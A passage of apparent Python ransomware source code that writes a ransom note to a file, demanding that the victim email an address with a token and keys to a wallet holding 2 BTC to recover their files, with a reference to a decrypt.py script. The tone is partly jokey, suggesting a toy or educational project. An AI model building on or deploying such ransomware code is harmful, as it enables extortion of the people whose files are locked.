...
f.write("Your token = " + claim_token + ". Email badguy@lego.com with YOUR TOKEN and secret keys to a wallet full of 2 BTC and a PDF of a handwritten thank you letter to ever see your files again. DELETE THIS FILE BEFORE DECRYPTING USING decrypt.py")
f.close()